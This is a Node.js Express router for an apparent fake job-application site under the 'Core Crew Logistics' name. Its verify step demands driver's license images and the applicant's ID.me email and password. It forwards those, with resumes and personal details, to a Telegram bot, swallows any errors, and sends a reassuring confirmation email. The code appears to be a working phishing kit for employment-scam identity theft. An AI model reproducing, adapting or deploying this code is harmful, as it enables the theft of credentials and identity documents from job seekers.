const path = require('path');
const os = require('os');
const fs = require('fs');
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const nodemailer = require('nodemailer');
const jobDetails = require('../data/jobDetails');

const router = express.Router();

// Storage for uploads (temp on disk)
const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 15 * 1024 * 1024 },
});

// Multer for driver's license front and back
const driversLicenseUpload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, os.tmpdir()),
    filename: (req, file, cb) => {
      const timestamp = Date.now();
      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
      cb(null, `dl-${timestamp}-${safe}`);
    },
  }),
  limits: { fileSize: 10 * 1024 * 1024 },
});

const dlFields = [
  { name: 'driversLicenseFront', maxCount: 1 },
  { name: 'driversLicenseBack', maxCount: 1 }
];

const JOB_POSITIONS = Object.values(jobDetails).map(j => j.title);

function normalizePosition(pos) {
  return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ').replace(/\s+/g, ' ').trim();
}

const INTERVIEW_QUESTIONS_MAP = {};

const DEFAULT_QUESTIONS = [
  { name: "about", label: "Tell us about yourself and your professional background." },
  { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
  { name: "challenge", label: "Describe a challenge you've overcome at work." },
  { name: "skills", label: "What skills would you bring to this position?" },
  { name: "goals", label: "Where do you see yourself in two years?" }
];

const COMPANY = {
  name: 'Core Crew Logistics',
  email: 'corecrewlogistics@gmail.com',
  phone: '+13105742415',
  address: '4700 Stockdale Hwy, Bakersfield, CA 93309',
  slogan: 'Reliable Freight, Warehousing & Jobs Across California & Beyond'
};

function requireSession(req, res, next) {
  if (!req.session) {
    console.warn('Session not available for req:', req.url);
    return res.status(500).render('error', { message: 'Session not available. Please enable session middleware.' });
  }
  next();
}

router.get('/', requireSession, (req, res) => {
  const selectedPosition = req.query.position;
  res.render('apply', { 
    positions: JOB_POSITIONS, 
    selectedPosition,
    COMPANY 
  });
});

router.post('/start', requireSession, upload.array('documents', 6), async (req, res) => {
  try {
    console.log('Starting application for:', req.body.firstName, req.body.lastName);
    
    const { firstName, lastName, email, phone, coverLetter, position } = req.body;
    req.session.applicationDraft = {
      firstName,
      lastName,
      email,
      phone,
      coverLetter,
      position,
      files: (req.files || []).map((f) => ({
        path: f.path,
        originalname: f.originalname,
        mimetype: f.mimetype,
      })),
    };

    const normalizedPosition = normalizePosition(position);
    const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
    const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
    req.session.interviewAnswers = null;

    // Force session save and wait for completion
    return new Promise((resolve, reject) => {
      req.session.save((err) => {
        if (err) {
          console.error('Session save error in /start:', err, req.session);
          return res.status(500).render('error', { message: 'Session save failed.' });
        }
        console.log('Session saved successfully in /start:', req.session);
        res.render('application-submitted', {
          questions: selectedQuestions,
          position,
          step: 2,
          isDefault
        });
        resolve();
      });
    });
  } catch (err) {
    console.error('Error in /start route:', err);
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

router.get('/interview', requireSession, (req, res) => {
  if (!req.session.applicationDraft) {
    console.log('No application draft found, redirecting to /apply');
    return res.redirect('/apply');
  }
  
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
  
  console.log('Rendering interview page for position:', pos);
  res.render('application-submitted', {
    questions: selectedQuestions,
    position: pos,
    step: 2,
    isDefault
  });
});

router.post('/interview', requireSession, express.urlencoded({ extended: true }), async (req, res) => {
  if (!req.session.applicationDraft) {
    console.log('No application draft found, redirecting to /apply');
    return res.redirect('/apply');
  }
  
  const pos = req.session.applicationDraft.position;
  const normalizedPosition = normalizePosition(pos);
  const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  
  const interviewAnswers = {};
  selectedQuestions.forEach(q => {
    interviewAnswers[q.name] = req.body[q.name] || '';
  });
  
  req.session.interviewAnswers = interviewAnswers;
  
  // Force session save and wait for completion
  return new Promise((resolve, reject) => {
    req.session.save((err) => {
      if (err) {
        console.error('Session save error in /interview:', err, req.session);
        return res.status(500).render('error', { message: 'Session save failed.' });
      }
      console.log('Session saved successfully, redirecting to info-note:', req.session);
      res.redirect('/apply/info-note');
      resolve();
    });
  });
});

router.get('/info-note', requireSession, (req, res) => {
  if (!req.session.applicationDraft) {
    console.log('No application draft found, redirecting to /apply');
    return res.redirect('/apply');
  }
  
  console.log('Rendering info-note page');
  res.render('info-note', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

router.get('/verify', requireSession, (req, res) => {
  if (!req.session.applicationDraft) {
    console.log('No application draft found, redirecting to /apply');
    return res.redirect('/apply');
  }
  
  console.log('Rendering verify page');
  res.render('verify', {
    email: req.session.applicationDraft.email || '',
    position: req.session.applicationDraft.position || ''
  });
});

router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');

  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }

  const { email, password } = req.body;
  req.session.verified = true;
  req.session.idme = { email, password };
  req.session.driversLicenseFiles = [dlFront, dlBack];

  const application = req.session.applicationDraft;
  const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
  const idmeCreds = { email, password };

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null) {
      answer = "";
    }
    answersObj[q.label] = answer;
  });

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  const qaPayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      phone: application.phone,
      position: application.position,
    },
    interview_answers: answersObj
  };

  const idmePayload = {
    applicant: {
      name: `${application.firstName} ${application.lastName}`,
      email: application.email,
      position: application.position,
    },
    idme_credentials: idmeCreds,
    drivers_license: {
      front: {
        filename: dlFront.originalname,
        mimetype: dlFront.mimetype,
      },
      back: {
        filename: dlBack.originalname,
        mimetype: dlBack.mimetype,
      },
    }
  };

  // Send application data (resume, cover letter, etc.) to Telegram
  try {
    await sendApplicationToTelegram(application);
  } catch (err) {
    console.warn('Failed to send application to Telegram:', err.message);
  }

  try {
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {}

  try {
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {}

  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {}

  req.session.save((err) => {
    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
    sendConfirmationEmail(email, req.session.applicationDraft.firstName)
      .then(() => res.redirect('/apply/submit'));
  });
});

router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  const dlFront = req.files['driversLicenseFront']?.[0];
  const dlBack = req.files['driversLicenseBack']?.[0];
  if (!dlFront || !dlBack) {
    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
  }
  req.session.driversLicenseFiles = [dlFront, dlBack];
  req.session.verified = true;
  req.session.idme = {};

  const application = req.session.applicationDraft;
  const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};

  const normalizedPosition = normalizePosition(application.position);
  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
  const answersObj = {};
  questions.forEach(q => {
    let answer = interviewAnswers[q.name];
    if (typeof answer === 'undefined' || answer === null) {
      answer = "";
    }
    answersObj[q.label] = answer;
  });

  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
  const timestamp = Date.now();

  // Send application data (resume, cover letter, etc.) to Telegram
  try {
    await sendApplicationToTelegram(application);
  } catch (err) {
    console.warn('Failed to send application to Telegram:', err.message);
  }

  try {
    const qaPayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        phone: application.phone,
        position: application.position,
      },
      interview_answers: answersObj
    };
    const qaFilename = `QA_${applicantName}_${timestamp}.json`;
    const qaFilepath = path.join(os.tmpdir(), qaFilename);
    fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(qaFilepath, qaFilename);
    fs.unlinkSync(qaFilepath);
  } catch (err) {}

  try {
    const idmePayload = {
      applicant: {
        name: `${application.firstName} ${application.lastName}`,
        email: application.email,
        position: application.position,
      },
      idme_credentials: {},
      drivers_license: {
        front: {
          filename: dlFront.originalname,
          mimetype: dlFront.mimetype,
        },
        back: {
          filename: dlBack.originalname,
          mimetype: dlBack.mimetype,
        },
      }
    };
    const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
    const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
    fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
    await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
    fs.unlinkSync(idmeFilepath);
  } catch (err) {}

  try {
    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
    fs.unlinkSync(dlFront.path);
    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
    fs.unlinkSync(dlBack.path);
    req.session.driversLicenseFiles = null;
  } catch (err) {}

  req.session.save((err) => {
    if (err) return res.status(500).render('error', { message: 'Session save failed.' });
    sendConfirmationEmail(application.email, application.firstName)
      .then(() => res.redirect('/apply/submit'));
  });
});

router.get('/submit', requireSession, (req, res) => {
  if (!req.session.applicationDraft) return res.redirect('/apply');
  res.render('submit', {
    email: req.session.applicationDraft.email || '',
    firstName: req.session.applicationDraft.firstName || ''
  });
});

router.post('/submit', requireSession, async (req, res) => {
  try {
    if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
    const data = req.session.applicationDraft;

    // Send final summary to Telegram
    try {
      const summary = `✅ Application Finalized\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}\nCover Letter: ${data.coverLetter || 'N/A'}\nInterview Answers: ${JSON.stringify(req.session.interviewAnswers || {})}\nTimestamp: ${new Date().toISOString()}`;
      const botToken = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;
      if (botToken && chatId) {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: summary }),
        });
      }
    } catch (e) {
      console.warn('Telegram final summary failed:', e.message);
    }

    req.session.applicationDraft = null;
    req.session.interviewAnswers = null;
    req.session.verified = null;
    req.session.idme = null;
    req.session.save((err) => {
      if (err) return res.status(500).render('error', { message: 'Session save failed.' });
      res.render('success');
    });
  } catch (err) {
    res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
  }
});

// Helper functions
async function sendApplicationToTelegram(data) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const summary = `New Application\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}\nCover Letter: ${data.coverLetter || "N/A"}`;
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: summary }),
      });
      const attachments = (data.files || []).map((f) => ({
        filename: f.originalname,
        path: f.path,
        contentType: f.mimetype,
      }));
      for (const f of attachments) {
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append('document', require('fs').createReadStream(f.path), {
          filename: f.filename,
          contentType: f.contentType,
        });
        await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
      }
    }
  } catch (e) {}
}

async function sendJsonFileToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {}
}

async function sendDocumentToTelegram(filepath, filename) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (botToken && chatId) {
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('document', fs.createReadStream(filepath), filename);
      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: 'POST',
        body: form,
        headers: form.getHeaders(),
      });
    }
  } catch (e) {}
}

async function sendConfirmationEmail(email, firstName) {
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || "smtp.gmail.com",
      port: process.env.SMTP_PORT || 465,
      secure: true,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });
    const htmlBody = `
      <div style="font-family:'Inter',Arial,sans-serif;max-width:600px;margin:0 auto;background:#f8fafc;border-radius:12px;overflow:hidden;border:1px solid #e5e9f2;">
        <div style="background:linear-gradient(135deg,#1846a3 0%,#2563eb 100%);padding:32px 24px;text-align:center;">
          <h1 style="color:#fff;margin:0 0 8px 0;font-size:22px;">Core Crew Logistics</h1>
          <p style="color:rgba(255,255,255,0.85);margin:0;font-size:14px;">Application Received</p>
        </div>
        <div style="padding:32px 24px;">
          <p style="color:#1a2636;font-size:16px;margin:0 0 16px 0;">Dear ${firstName || 'Applicant'},</p>
          <p style="color:#64748b;font-size:15px;line-height:1.6;margin:0 0 16px 0;">
            Thank you for submitting your application with <strong style="color:#1846a3;">Core Crew Logistics</strong>. We have successfully received your submission and our hiring team is now reviewing your information.
          </p>
          <div style="background:#fff;border:1px solid #e5e9f2;border-radius:8px;padding:20px;margin:20px 0;">
            <h3 style="color:#1846a3;margin:0 0 12px 0;font-size:15px;">What happens next?</h3>
            <ul style="color:#64748b;font-size:14px;line-height:1.8;margin:0;padding-left:20px;">
              <li>Our team will review your application carefully</li>
              <li>You may be contacted for additional information</li>
              <li>Qualified candidates will be scheduled for an interview</li>
              <li>We aim to respond within 5–7 business days</li>
            </ul>
          </div>
          <p style="color:#64748b;font-size:14px;line-height:1.6;margin:16px 0 0 0;">
            If you have any questions in the meantime, please don't hesitate to reach out to us at
            <a href="mailto:corecrewlogistics@gmail.com" style="color:#1846a3;text-decoration:none;font-weight:600;">corecrewlogistics@gmail.com</a>
            or call <a href="tel:+13105742415" style="color:#1846a3;text-decoration:none;font-weight:600;">310-574-2415</a>.
          </p>
        </div>
        <div style="background:#0a1628;padding:20px 24px;text-align:center;">
          <p style="color:rgba(255,255,255,0.6);font-size:12px;margin:0;">&copy; ${new Date().getFullYear()} Core Crew Logistics. All rights reserved.</p>
          <p style="color:rgba(255,255,255,0.4);font-size:11px;margin:6px 0 0 0;">4700 Stockdale Hwy, Bakersfield, CA 93309</p>
        </div>
      </div>`;
    await transporter.sendMail({
      from: `"Core Crew Logistics" <${process.env.SMTP_USER}>`,
      to: email,
      subject: "Application Received — Core Crew Logistics",
      text: `Dear ${firstName || 'Applicant'},\n\nThank you for submitting your application with Core Crew Logistics. We have successfully received your submission and our hiring team is now reviewing your information.\n\nWhat happens next?\n- Our team will review your application carefully\n- You may be contacted for additional information\n- Qualified candidates will be scheduled for an interview\n- We aim to respond within 5-7 business days\n\nIf you have any questions, please contact us at corecrewlogistics@gmail.com or call 310-574-2415.\n\nBest regards,\nCore Crew Logistics Team\n4700 Stockdale Hwy, Bakersfield, CA 93309`,
      html: htmlBody,
    });
  } catch (e) {
    console.warn('Email send failed:', e.message);
  }
}

module.exports = router;